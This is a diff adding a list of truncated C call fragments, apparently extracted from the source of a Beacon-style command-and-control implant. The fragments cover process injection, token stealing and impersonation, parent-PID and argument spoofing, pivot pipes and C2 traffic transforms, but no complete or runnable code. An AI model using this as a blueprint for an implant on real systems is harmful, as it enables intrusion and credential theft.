@@ -1,0 +1,1603 @@
+"(!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid"
+"(!BeaconDataStringCopySafe(&parser, cmd, 0x4000"
+"(!BeaconDataStringCopySafe(&parser, description, sizeof(description"
+"(!BeaconDataStringCopySafe(&parser, domain, 0x400"
+"(!BeaconDataStringCopySafe(&parser, domain, MAX_DOMAIN"
+"(!BeaconDataStringCopySafe(&parser, filename, sizeof(filename"
+"(!BeaconDataStringCopySafe(&parser, password, 0x400"
+"(!BeaconDataStringCopySafe(&parser, password, MAX_PASSWORD"
+"(!BeaconDataStringCopySafe(&parser, username, 0x400"
+"(!BeaconDataStringCopySafe(&parser, username, MAX_USERNAME"
+"(!CheckTokenMembership(NULL, sid, &isAdmin"
+"(!ConnectNamedPipe(hPrenamedPipe, NULL"
+"(!CopyFileA(existingFileName, newFileName, FALSE"
+"(!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &gIdentityToken"
+"(!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &gIdentityToken"
+"(!ExecuteInjection(injection, target, pOffset, parameter"
+"(!GetAccountNameFromToken(hProcess, accountName, sizeof(accountName"
+"(!GetThreadContext(hThread, &context"
+"(!GetThreadContext(processInfo->hThread, &ctx"
+"(!GetTokenInformation(hToken, TokenUser, tokenInfo, sizeof(tokenInfo"
+"(!HttpQueryInfoA(hInternet, HTTP_QUERY_STATUS_CODE, status, &statusCodeLength, NULL"
+"(!IdentityGetUserInfo(gIdentityToken, buffer, MAX_BUFFER"
+"(!InitializeProcThreadAttributeList(attributeList, dwAttributeCount, 0, &size"
+"(!InternetReadFile(hInternet, data + totalBytesRead, MAX_READ, &bytesAvailable"
+"(!LinkAdd(&protocol, port"
+"(!LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &gIdentityToken"
+"(!LookupAccountSidA(NULL, ((TOKEN_USER*"
+"(!MoveFileA(src, dst"
+"(!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken"
+"(!PeekNamedPipe(hNamedPipe, NULL, 0, NULL, &available, NULL"
+"(!PeekNamedPipe(hPipe, NULL, 0, NULL, &lpTotalBytesAvail, NULL"
+"(!PeekNamedPipe(hPipe, NULL, 0, NULL, &totalBytesAvail, NULL"
+"(!PipeConnectWithToken(filename, &hPipe, impersonate ? 0x20000 : 0"
+"(!PipeConnectWithToken(text, &hFile, 0"
+"(!ProcessIdToSessionId(pe.th32ProcessID, &sid"
+"(!ProcessIdToSessionId(pid, &sessionId"
+"(!ProtocolSmbPipeWrite(protocol->channel.handle, header, headerSize"
+"(!ProtocolTcpSocketWrite(protocol->channel.socket, header, headerSize"
+"(!ReadFile(channel, buffer + totalRead, length - totalRead, &read, NULL"
+"(!ReadProcessMemory(injection->process, lpApcContext, &data, sizeof(APC_ROUTINE_CONTEXT"
+"(!ReadProcessMemory(processInfo->hProcess, &peb->ProcessParameters, &processParameters, sizeof(peb->ProcessParameters"
+"(!ReadProcessMemory(processInfo->hProcess, &processParameters.CommandLine, &commandLine, sizeof(commandLine"
+"(!SetNamedPipeHandleState(*pipe, &mode, NULL, NULL"
+"(!SetNamedPipeHandleState(file, &mode, NULL, NULL"
+"(!SetThreadContext(hThread, &context"
+"(!UpdateProcThreadAttribute(attributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &context->processAttribute, sizeof(context->processAttribute"
+"(!UpdateProcThreadAttribute(attributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE"
+"(!VirtualProtect(payload, size, S_PROCINJ_PERMS, &flOldProtect"
+"(!VirtualProtectEx(hProcess, lpBaseAddress, dwSize, S_PROCINJ_PERMS, &flOldProtect"
+"(!VirtualProtectEx(processInfo->hProcess, commandLine.Buffer, commandLine.MaximumLength, PAGE_READWRITE, &flOldProtect"
+"(!WSAIoctl(sock, SIO_GET_INTERFACE_LIST, NULL, 0, interfaceInfo, sizeof(interfaceInfo"
+"(!WaitNamedPipeA(lpFileName, 10000"
+"(!Wow64GetThreadContext(hThread, &context"
+"(!Wow64SetThreadContext(hThread, &context"
+"(!WriteFile(hFile, buffer + totalWrote, toWrite, &wrote, NULL"
+"(!WriteFile(hFile, data + total, toWrite, &wrote, NULL"
+"(!WriteProcessMemory(hProcess, lpBaseAddress + total, payload + total, size - total, &wrote"
+"(!WriteProcessMemory(processInfo->hProcess, commandLine.Buffer, newCmd, commandLine.MaximumLength, &wrote"
+"(!current->isActive && strcmp(expanded, current->expandedCmd"
+"(!hProcess || !TerminateProcess(hProcess, 0"
+"(!protocol->waitForData(protocol, 30000, 10"
+"(!strncmp(filename, ""."" SOURCE_DIRECTORY, MAX_FILENAME"
+"(!toWideChar(cmds->cmd, newCmd, commandLine.MaximumLength / sizeof(WCHAR"
+"(""%d is a x64 process (can't inject x86 content"
+"(""%d is a x86 process (can't inject x64 content"
+"(""%s%s "" ANSI_COLOR_RESET, color, label"
+"(""Allocate section and copy data failed: %s"", LAST_ERROR_STR(lastError"
+"(""Cannot find RtlCreateUserThread in ntdll.dll"""
+"(""Copy failed: %s"", LAST_ERROR_STR(lastError"
+"(""Could not adjust arguments in process: %s - Reason: Could not adjust permissions"", LAST_ERROR_STR(lastError"
+"(""Could not adjust arguments in process: %s - Reason: Could not get thread context"", LAST_ERROR_STR(lastError"
+"(""Could not adjust arguments in process: %s - Reason: Could not read command line"", LAST_ERROR_STR(lastError"
+"(""Could not adjust arguments in process: %s - Reason: Could not read process parameters"", LAST_ERROR_STR(lastError"
+"(""Could not adjust arguments in process: %s - Reason: Could not write new command line"", LAST_ERROR_STR(lastError"
+"(""Could not adjust permissions in process: %s"", LAST_ERROR_STR(lastError"
+"(""Could not allocate %d bytes in process: %s"", dwSize, LAST_ERROR_STR(lastError"
+"(""Could not allocate memory for route aux"""
+"(""Could not bind to %d"", port"
+"(""Could not connect to pipe (%s"
+"(""Could not connect to pipe: %s"", LAST_ERROR_STR(lastError"
+"(""Could not connect to target (stager"
+"(""Could not create remote thread in %d: %s"", injection->pid, LAST_ERROR_STR(lastError"
+"(""Could not create token: %s"", LAST_ERROR_STR(error"
+"(""Could not determine full path of '%s'""; , lpFileName"
+"(""Could not do PipeConnect. Retrying with Revert/Impersonate"""
+"(""Could not kill %d: %s"", pid, LAST_ERROR_STR(lastError"
+"(""Could not open %s: %s"", filename, LAST_ERROR_STR(lastError"
+"(""Could not open '%s'"", lpFileName"
+"(""Could not open process %d: %s"", pid, LAST_ERROR_STR(lastError"
+"(""Could not open process token"""
+"(""Could not open process token: %d (%s"
+"(""Could not resolve API %s!%s"", lpModuleName, lpProcName"
+"(""Could not run %s as %s\\%s: %s"", cmd, domain, username, LAST_ERROR_STR(lastError"
+"(""Could not run command(w / token"
+"(""Could not set PID to %d: %s"", parentPid, LAST_ERROR_STR(lastError"
+"(""Could not spawn %s (token"
+"(""Could not spawn %s (token&creds"
+"(""Could not spawn %s: %s"", execution->cmd, LAST_ERROR_STR(lastError"
+"(""Could not update process attribute: %s"", LAST_ERROR_STR(lastError"
+"(""Could not upload file: %s"", LAST_ERROR_STR(error"
+"(""Could not write to process memory: %s"", LAST_ERROR_STR(lastError"
+"(""Failed to duplicate token from %d (%s"
+"(""Failed to impersonate logged on user %d (%s"
+"(""Failed to impersonate token from %d (%s"
+"(""Failed to impersonate token: %s"", LAST_ERROR_STR(error"
+"(""Failed to impersonate token: %s"", LAST_ERROR_STR(lastError"
+"(""Failed to open token"""
+"(""Failed to parse domain"""
+"(""Failed to parse password"""
+"(""Failed to parse username"""
+"(""File '%s' is either too large (>4GB"
+"(""Invalid proxy behavior: %d"", S_PROXY_BEHAVIOR"
+"(""Maximum links reached. Disconnect one"""
+"(""Move failed: %s"", LAST_ERROR_STR(lastError"
+"(""No slot for function (reduce number of Win32 APIs called"
+"(""PPID %d is in a different desktop session (spawned jobs may fail"
+"(""Prepend parameter %d is greater than recoverable length %d"", param, recoverableLength"
+"(""Real arguments are longer than fake arguments."""
+"(""Relocation truncated to fit (distance between executable code and other data is >4GB"
+"(""Un-implemented relocation type %d"", relocation->r_type"
+"(""Unknown command: %d"", cmd"
+"(""Unknown data argument %d"", dataArgument"
+"(""Unknown step %d"", step"
+"(""\n"""
+"(""\n"", """", __VA_ARGS__"
+"(""\r\n"""
+"(""gSpawnToX64 is not NULL or empty"""
+"(""gSpawnToX86 is not NULL or empty"""
+"(""kernel32"""
+"(""kernel32$IsWow64Process: IsWow64Process is NULL"""
+"(""ntdll"""
+"(""ntdll.dll"""
+"(""sysnative"""
+"(""x64 Beacon cannot adjust arguments in x86 process"""
+"(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"""
+"(&addr.sin_addr, host->h_addr, host->h_length"
+"(&childContext, parentPid, lpAttributeList, runUnderConfig->startupInfo"
+"(&cmds, execution->cmd"
+"(&findData.ftLastWriteTime, &systemTime"
+"(&format, ""%d\t%d\t%s\n"", job->id, job->pid32, job->description"
+"(&format, ""%s\n"", current->expandedFullCmd"
+"(&format, &acp, 2"
+"(&format, &oemcp, 2"
+"(&format, 0"
+"(&format, 0x8000"
+"(&format, GetModuleHandleA"
+"(&format, GetProcAddress"
+"(&format, IS_X64("
+"(&format, MAX_FILENAME + MAX_BUFFER"
+"(&format, METADATA_ID"
+"(&format, activeAdapterIPv4"
+"(&format, append, appendSize"
+"(&format, bid"
+"(&format, buf, read - sizeof(int"
+"(&format, currentPid"
+"(&format, download->fid"
+"(&format, fileSize"
+"(&format, flags"
+"(&format, gBid"
+"(&format, info, min(strlen(info"
+"(&format, lpBuffer, fullPathSize"
+"(&format, openLink->callbackData, MAX_CALLBACK_DATA"
+"(&format, osVersionInfo->dwBuildNumber"
+"(&format, osVersionInfo->dwMajorVersion"
+"(&format, osVersionInfo->dwMinorVersion"
+"(&format, out, sizeof(out"
+"(&format, payload, pLen"
+"(&format, pivotHints"
+"(&format, prepend, prependSize"
+"(&format, prependSize + appendSize + pLen + 16"
+"(&format, size"
+"(&gIdentityDomain, 0, IDENTITY_MAX_WCHARS_DOMAIN"
+"(&gRecords[gRecordCapacity], 0, sizeof(RECORD_ENTRY"
+"(&hRead, &hWrite, &sa, 0x100000"
+"(&injection, payload, pLen, pOffset, parameter"
+"(&injection, str, aLen"
+"(&lPi, hRead, hWrite, ""process"""
+"(&locals, ""%s\n"", filename"
+"(&locals, ""%u"", logicalDrives"
+"(&locals, 0x200000"
+"(&locals, 0x8000"
+"(&locals, 128"
+"(&locals, channel->port"
+"(&locals, channelId"
+"(&locals, isPending"
+"(&locals, reqno"
+"(&locals, value"
+"(&parser, &bytesPair"
+"(&parser, &codePair"
+"(&parser, &dataPair"
+"(&parser, &rdataPair"
+"(&parser, &relocationsPair"
+"(&parser, 0x4000"
+"(&parser, IS_X64("
+"(&parser, S_PROCINJ_EXECUTE, 128"
+"(&parser, appendSize"
+"(&parser, args, MAX_ARGS"
+"(&parser, argumentLength"
+"(&parser, buffer, length"
+"(&parser, buffer, read"
+"(&parser, buffer, size"
+"(&parser, cmd, MAX_CMD"
+"(&parser, data, size"
+"(&parser, description, MAX_DESCRIPTION"
+"(&parser, dst, MAX_DST"
+"(&parser, existingFileName, MAX_EXISTING_FILENAME"
+"(&parser, expandedFull, MAX_EXPANDED_FULL"
+"(&parser, filename, MAX_FILENAME"
+"(&parser, headerLength"
+"(&parser, lpFileName, 0x400"
+"(&parser, lpFileName, MAX_FILENAME"
+"(&parser, name, sizeof(name"
+"(&parser, newFileName, MAX_NEW_FILENAME"
+"(&parser, original, MAX_ORIGINAL"
+"(&parser, param, sizeof(param"
+"(&parser, prependSize"
+"(&parser, recover, maxGet"
+"(&parser, request_profile, MAX_REQUEST_PROFILE"
+"(&parser, runnableCmd, MAX_RUNNABLE_CMD"
+"(&parser, setting, headerSize"
+"(&parser, size"
+"(&parser, src, MAX_SRC"
+"(&parser, text, sizeof(text"
+"(&pi, data, size, 0, NULL, 0"
+"(&pi, hRead, hWrite, description"
+"(&pi, payload, payloadLength, 0, NULL, 0"
+"(&pi, payload, payloadLength, reflectiveLoaderOffset, argument, argumentLength"
+"(&protocol, channel->port | HINT_PROTO_TCP | HINT_REVERSE"
+"(&protocol, file"
+"(&protocol, port | PIVOT_HINT_PROTO_TCP"
+"(&protocol, sock"
+"(&relocationsParser, relocations, relocationsPair.size"
+"(&relocationsParser, sizeof(RELOCATION"
+"(&runUnderConfig, 0"
+"(&si.hStdError, 0, sizeof(si.hStdError"
+"(&si.hStdInput, 0, sizeof(si.hStdInput"
+"(&si.hStdOutput, 0, sizeof(si.hStdOutput"
+"(&sockaddr.sin_addr, lHostent->h_addr, lHostent->h_length"
+"(&transform, 0, sizeof(transform"
+"(&transform, S_C2_POSTREQ, bid, strlen(bid"
+"(&transform, S_C2_REQUEST, session->data, session->length, NULL, 0"
+"(&transform, gPostBufferLength"
+"(&transform, maxGet"
+"() ? ""%s (admin"
+"() LOG(""\n"""
+"(*sleepTime, 1000 * S_MAX_RETRY_STRATEGY_DURATION"
+"(0, &readfds, &writefds, &exceptfds, &timeout"
+"(0, NULL, &writefds, &exceptfds, &lTimeval"
+"(0x400, lpCurrentDirectory"
+"(3 * size, 0x2000"
+"(AF_INET, SOCK_DGRAM, 0, NULL, 0, 0"
+"(AF_INET, SOCK_STREAM, IPPROTO_HOPOPTS"
+"(ANSI_COLOR_BLUE, ""[INFO]"", __VA_ARGS__"
+"(ANSI_COLOR_GREEN, ""[OK]"", __VA_ARGS__"
+"(ANSI_COLOR_MAGENTA, ""[TODO]"", __VA_ARGS__"
+"(ANSI_COLOR_RED, ""[ERROR]"", __VA_ARGS__"
+"(ANSI_COLOR_YELLOW, ""[WARNING]"", __VA_ARGS__"
+"(AdjustMemoryPermissions(img, codeLength"
+"(AdjustMemoryPermissions(pAlloc, dwSize"
+"(AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, NULL, NULL"
+"(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pInfo"
+"(BOOL x86, BOOL ignoreToken, STARTUPINFO* si, PROCESS_INFORMATION* pInfo"
+"(BOOL x86, BOOL ignoreToken, STARTUPINFO* si, PROCESS_INFORMATION* pi, int pid"
+"(BOOL x86, char * buffer, int length"
+"(BOOL x86, char* buffer, int length"
+"(BOOL x86, char* cmd"
+"(BOOL x86, char* lpDomain, char* lpUsername, char* lpPassword, PROCESS_INFORMATION* lpProcessInfo"
+"(BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi"
+"(CALLBACK_ACCEPT, cbData, cbLength"
+"(CALLBACK_CLOSE, buffer, sizeof(channelId"
+"(CALLBACK_CLOSE, buffer, sizeof(id"
+"(CALLBACK_CLOSE, gChannelBuffer, sizeof(int"
+"(CALLBACK_DEAD, NULL, 0"
+"(CALLBACK_FILE, cbBuffer, cbLength"
+"(CALLBACK_FILE_CLOSE, (char*"
+"(CALLBACK_FILE_WRITE, (char*"
+"(CALLBACK_JOBS, buffer, size"
+"(CALLBACK_OUTPUT, buffer, size"
+"(CALLBACK_OUTPUT, data, size"
+"(CALLBACK_PENDING, data, size"
+"(CALLBACK_PING, (char*"
+"(CALLBACK_PIPE_CLOSE, (char*"
+"(CALLBACK_PIPE_OPEN, gLinks[i].callbackData, gLinks[i].callbackLength"
+"(CALLBACK_PIPE_OPEN, openLink->callbackData, openLink->callbackLength"
+"(CALLBACK_PIPE_PING, (char*"
+"(CALLBACK_PIPE_READ, (char*"
+"(CALLBACK_PWD, data, length"
+"(CALLBACK_READ, gChannelBuffer, size + sizeof(int"
+"(CALLBACK_TOKEN_GETUID, uidString, strlen(uidString"
+"(CALLBACK_TOKEN_STOLEN, accountName, strlen(accountName"
+"(CALLBACK_TOKEN_STOLEN, buffer, strlen(buffer"
+"(CALLBACK_TOKEN_STOLEN, username, strlen(username"
+"(CFGCautionThreadStub, (unsigned int"
+"(DOWNLOAD_ENTRY* download, int chunkMaxSize"
+"(DWORD option, HANDLE hProcess, LPVOID lpAddress, LPVOID lpParameter, LPCSTR lpModuleName, LPCSTR lpProcName, DWORD ordinal"
+"(ERROR_ADJUST_ARGUMENTS_FAILED, lastError"
+"(ERROR_ADJUST_PERMISSIONS_FAILED, lastError"
+"(ERROR_ALLOC_SECTION_FAILED, lastError"
+"(ERROR_CONNECT_TO_PIPE_FAILED, lastError"
+"(ERROR_CONNECT_TO_TARGET_FAILED, error"
+"(ERROR_COPY_FAILED, lastError"
+"(ERROR_CREATE_REMOTE_THREAD_FAILED, injection->pid, lastError"
+"(ERROR_CREATE_TOKEN_FAILED, error"
+"(ERROR_DOWNLOAD_OPEN_FAILED, lpFileName"
+"(ERROR_DOWNLOAD_PATH_TOO_LONG, lpFileName"
+"(ERROR_DOWNLOAD_SIZE_CHECK_FAILED, lpFileName"
+"(ERROR_DUPLICATE_TOKEN_FAILED, pid, lastError"
+"(ERROR_IMPERSONATE_LOGGED_ON_USER_FAILED, pid, lastError"
+"(ERROR_IMPERSONATE_STEAL_TOKEN_FAILED, pid, lastError"
+"(ERROR_IMPERSONATE_TOKEN_FAILED, error"
+"(ERROR_KILL_FAILED, pid, lastError"
+"(ERROR_LENGTHY_WIDECHAR_COMMAND, runUnderConfig->cmdLength"
+"(ERROR_LIST_OPEN_FAILED, lastError, filename"
+"(ERROR_LOCAL_ALLOC_FAILED, dwSize, lastError"
+"(ERROR_MOVE_FAILED, lastError"
+"(ERROR_OPEN_PROCESS_FAILED, pid, lastError"
+"(ERROR_OPEN_PROCESS_TOKEN_FAILED, pid, lastError"
+"(ERROR_PARENT_PROCESS_NOT_IN_SAME_SESSION, gParentPid"
+"(ERROR_POST_IMPERSONATE_TOKEN_FAILED, lastError"
+"(ERROR_RESOLVE_API_FAILED, ""%s!%s"", lpModuleName, lpProcName"
+"(ERROR_RUN_AS_USER_FAILED, ""%s as %s\\%s: %d"", cmd, domain, username, lastError"
+"(ERROR_SET_PID_FAILED, parentPid, lastError"
+"(ERROR_SOCKET_CREATE_BIND_FAILED, port"
+"(ERROR_SPAWN_PROCESS_AS_USER_FAILED, lastError, execution->cmd"
+"(ERROR_SPAWN_PROCESS_FAILED, lastError, execution->cmd"
+"(ERROR_SPAWN_TOKEN_AND_CREDS, lastError, runUnderConfig->cmd"
+"(ERROR_STAGER_VIA_TCP_CONNECTION_FAILED, text, lastError"
+"(ERROR_UNIMPLEMENTED_RELOCATION_TYPE, relocation->r_type"
+"(ERROR_UPDATE_PROC_THREAD_ATTRIBUTE_LIST_FAILED, lastError"
+"(ERROR_UPLOAD_OPEN_FAILED, lastError"
+"(ERROR_WRITE_TO_PROC_MEMORY_FAILED, lastError"
+"(EXPANDED_CMD* extendedCmd, const char* cmd"
+"(ExecuteViaCreateRemoteThread(injection->process, lpStartAddress + offset, lpParameter"
+"(ExecuteViaCreateRemoteThread_s(METHOD_CREATE_REMOTE_THREAD_S, injection->process, lpStartAddress + offset, lpParameter, lpModuleName, lpProcName, ordinal"
+"(ExecuteViaCreateRemoteThread_s(METHOD_CREATE_THREAD_S, injection->process, lpStartAddress + offset, lpParameter, lpModuleName, lpProcName, ordinal"
+"(ExecuteViaCreateThread(injection, lpStartAddress + offset, lpParameter"
+"(ExecuteViaNtQueueApcThread(injection, lpStartAddress + offset, lpParameter"
+"(ExecuteViaNtQueueApcThread_s(injection, lpStartAddress + offset, lpParameter"
+"(ExecuteViaRtlCreateUserThread(injection->process, lpStartAddress + offset, lpParameter"
+"(ExecuteViaSetThreadContext(injection, lpStartAddress + offset, lpParameter"
+"(FD_ISSET(sock, &exceptfds"
+"(FD_ISSET(sock, &readfds"
+"(FD_ISSET(sock, &writefds"
+"(FindNextFileA(firstFile, &findData"
+"(FindNextFileA(hFindFile, lpCurrentFindFileData"
+"(GetCurrentDirectoryW(0, 0"
+"(GetModuleFileNameA(NULL, fileName, MAX_FILE_NAME"
+"(HANDLE channel, char* buffer, int length"
+"(HANDLE hFile, char* buffer, int length"
+"(HANDLE hNamedPipe, DWORD waitTime, int iterWaitTime"
+"(HANDLE hPipe, char* buffer, int size"
+"(HANDLE hProcess, DWORD pid, const char* payload, int size"
+"(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter"
+"(HANDLE hProcess, char* accountName, int length"
+"(HANDLE hProcess, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len"
+"(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len"
+"(HANDLE hRead, int pid32, int callbackType, char* description, BOOL isMsgMode"
+"(HANDLE hToken, char* buffer, int size"
+"(HANDLE handle, DWORD pid, const char* payload, int size"
+"(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength"
+"(HMODULE hModule, LPCSTR lpProcName"
+"(INADDR_ANY, port, 1"
+"(INADDR_ANY, port, 10"
+"(INJECTION* injection, CHAR* lpStartAddress, DWORD offset, LPVOID lpParameter"
+"(INJECTION* injection, CHAR* lpStartAddress, LPVOID lpParameter"
+"(INJECTION* injection, LPVOID lpStartAddress, LPVOID lpParameter"
+"(INJECTION* injection, char* payload, int size, int pOffset, char* parameter"
+"(INJECTION* injection, const char* payload, int size"
+"(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL"
+"(IdentityElevationThread, NULL"
+"(IdentityGetUserInfo(gIdentityToken, (char*"
+"(IdentityGetUserInfo(gIdentityToken, accountName, sizeof(accountName"
+"(IdentityGetUserInfo(hElevationToken, accountName, sizeof(accountName"
+"(IdentityGetUserInfo(hToken, userInfo, sizeof(userInfo"
+"(LPCCH domain, LPCCH username, LPCCH password, LPCCH cmd, int creationFlags, LPPROCESS_INFORMATION lpProcessInfo"
+"(LPCSTR filename, HANDLE* pipe"
+"(LPCSTR filename, HANDLE* pipe, DWORD flags"
+"(LPCSTR lpFileName, HANDLE* pipe, DWORD flags"
+"(LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszAgent"
+"(LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter"
+"(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType"
+"(LookupPrivilegeValueA(NULL, name, &tokenPrivileges.Privileges[0].Luid"
+"(MAX_FILENAME, filename"
+"(NULL, "","""
+"(NULL, &systemTime, &localTime"
+"(NULL, 0, (LPTHREAD_START_ROUTINE"
+"(NULL, 0, gThreadStartAddress, pThreadInfo->lpStartAddress, 0, NULL"
+"(NULL, 0, lpStartAddress, lpParameter, 0, NULL"
+"(NULL, codeLength, MEM_COMMIT | MEM_RESERVE, S_PROCINJ_PERMS_I"
+"(NULL, dwAttributeCount, 0, &size"
+"(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, S_PROCINJ_PERMS_I"
+"(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len"
+"(OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken"
+"(OpenThreadToken(hCurrentThread, TOKEN_ALL_ACCESS, FALSE, &hElevationToken"
+"(PROCESS_ALL_ACCESS, FALSE, parentPid"
+"(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid"
+"(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len"
+"(PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len"
+"(PROCESS_INFORMATION* pi, HANDLE hRead, HANDLE hWrite, char* description"
+"(PROCESS_INFORMATION* processInfo, EXPANDED_CMD* cmds"
+"(PROCESS_QUERY_INFORMATION, FALSE, pid"
+"(PROCESS_TERMINATE, FALSE, pid"
+"(PROTOCOL* protocol, DWORD waitTime, int iterWaitTime"
+"(PROTOCOL* protocol, HANDLE handle"
+"(PROTOCOL* protocol, SOCKET socket"
+"(PROTOCOL* protocol, char* buffer, int length"
+"(PROTOCOL* protocol, int pivotHints"
+"(PRUN_UNDER_CONTEXT context, DWORD parentPid, LPPROC_THREAD_ATTRIBUTE_LIST attributeList, STARTUPINFO* si"
+"(PipeConnect(filename, pipe, 0"
+"(Process32First(toolhelp, &pe"
+"(Process32Next(toolhelp, &pe"
+"(ProtocolSmbPipeRead(hPipe, (char*"
+"(RELOCATION* relocation, char* code, char* img, char* pSection, unsigned long offsetInSection"
+"(ROUTE_DATA, data"
+"(RUN_UNDER_CONFIG* runUnderConfig, WCHAR* cmd, const WCHAR* currentDirectory"
+"(RUN_UNDER_CONFIG* runUnderConfig, int parentPid"
+"(RandomIntInRange(0, gRandomTokenCount - 1"
+"(ReadFile(hPrenamedPipe, toRead, sizeof(char"
+"(RunUnderParent(buffer, length, &si, &pi, CREATE_NEW_CONSOLE, FALSE"
+"(SOCKET channel, char* buffer, int length"
+"(SOCKET socket, char* buffer, int length"
+"(SOCKET socket, char* content, int contentLength"
+"(SOCKET socket, char* data, int size"
+"(SOCKET socket, int id, int timeoutPeriod, int type, int port, int state"
+"(S_C2_RECOVER, data, totalBytesRead, maxGet"
+"(S_PROCINJ_MINALLOC, size"
+"(S_PUBKEY, format.original, format.length, gSession.data, &gSession.length"
+"(S_SMB_FRAME_HEADER, 0, &headerSize"
+"(S_SMB_FRAME_HEADER, length, &headerSize"
+"(S_TCP_FRAME_HEADER, 0, &headerSize"
+"(S_TCP_FRAME_HEADER, length, &headerSize"
+"(SpawnAsUserInternal(x86, domain, username, password, &pi"
+"(SpawnUnderInternal(x86, TRUE, &si, &pi, pid"
+"(TH32CS_SNAPPROCESS, 0"
+"(TH32CS_SNAPTHREAD, 0"
+"(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID"
+"(TRANSFORM* transform, int size"
+"(Thread32Next(hSnapshot, &te32"
+"(WSAStartup(MAKEWORD(2, 2"
+"(WebResponseReceiveUntilNewline(acceptSocket, webResponse->data, MAX_DATA_SIZE"
+"(WebResponseThread, webResponse"
+"(_In_ HANDLE ProcessHandle, _In_opt_ PSECURITY_DESCRIPTOR SecurityDescriptor, _In_ BOOLEAN CreateSuspended, _In_opt_ ULONG StackZeroBits, _In_opt_ SIZE_T StackReserve, _In_opt_ SIZE_T StackCommit, _In_ PVOID StartAddress, _In_opt_ PVOID Parameter, _Out_opt_ PHANDLE ThreadHandle, _Out_opt_ PCLIENT_ID ClientId"
+"(_In_ HANDLE SectionHandle, _In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _In_ SIZE_T CommitSize, _Inout_opt_ PLARGE_INTEGER SectionOffset, _Inout_ PSIZE_T ViewSize, _In_ SECTION_INHERIT InheritDisposition, _In_ ULONG AllocationType, _In_ ULONG Win32Protect"
+"(_In_ HANDLE ThreadHandle, _In_ PVOID ApcRoutine, _In_ PVOID ApcRoutineContext OPTIONAL, _In_ PVOID ApcStatusBlock OPTIONAL, _In_ PVOID ApcReserved OPTIONAL"
+"(_In_ HANDLE hProcess, _Out_ PBOOL Wow64Process"
+"(_In_ HMODULE hModule, _In_ LPCSTR lpProcName"
+"(_In_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flNewProtect, _Out_ PDWORD lpflOldProtect"
+"(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ __drv_aliasesMem LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId"
+"(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect"
+"(_NtQueueApcThread(injection->thread, lpStartAddress, lpParameter, NULL, NULL"
+"(acceptSocket, content, contentLength"
+"(acceptSocket, webResponse->content, webResponse->contentLength, 0"
+"(acceptSocket, webResponse->header, webResponse->headerLength, 0"
+"(api, lpProc"
+"(args, fmt"
+"(aux, after, afterLength"
+"(bapi* api, PROC newFunction"
+"(bid, 0, sizeof(bid"
+"(bid, sizeof(bid"
+"(buffer, 0, MAX_BUFFER"
+"(buffer, 0, size"
+"(buffer, b, bufferSize"
+"(buffer, cmd, size"
+"(buffer, expanded, MAX_EXPANDED"
+"(buffer, length, gIdentityToken, &locals"
+"(buffer, length, hToken, &locals"
+"(buffer, parser->buffer, parser->length"
+"(buffer, ptr, parser->length"
+"(buffer, size"
+"(buffer, size, ""%s\\%s"", domain, name"
+"(buffer, size, ""ab"""
+"(buffer, size, ""wb"""
+"(buffer, size, 0"
+"(buffer, size, FALSE"
+"(buffer, size, FALSE, FALSE"
+"(buffer, size, FALSE, TRUE"
+"(buffer, size, LOCALHOST"
+"(buffer, size, TRUE"
+"(buffer, size, TRUE, FALSE"
+"(buffer, size, TRUE, TRUE"
+"(bufferSize, 1024 - 1"
+"(bytes, bytesPair.size"
+"(callbackType, waitTime, reflectiveLoaderOffset, payload, payloadLength, argument, argumentLength, description, descriptionLength, x86, ignoreToken"
+"(cbc_encrypt(buffer, buffer, length, &gEncryptCbc"
+"(cbc_start(gAesCipher, gIv, gCbcKey, sizeof(gCbcKey"
+"(channel, buffer + totalRead, length - totalRead, 0"
+"(channel, buffer, length, 0"
+"(channel->socket, NULL, NULL"
+"(char * src, wchar_t * dst, int max"
+"(char nb, const char* in, int inlen, char* out, int outlen"
+"(char* buff, int len"
+"(char* buffer, int length"
+"(char* buffer, int length, BOOL x86"
